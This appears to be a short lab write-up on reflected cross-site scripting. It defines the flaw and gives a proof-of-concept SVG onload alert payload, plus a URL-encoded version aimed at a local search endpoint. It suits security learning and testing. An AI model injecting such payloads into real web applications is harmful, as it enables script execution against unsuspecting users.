VULNERABILITY DESCRIPTION
Reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the input provided by the user as part of the request, without that data being made safe to render in the browser, and without permanently storing the user provided data.



EXPLOIT
<svg onload=alert()>


You can also use it directly in the url:
http://localhost:3000/search?query=%3Csvg+onload%3Dalert%28%29%3E
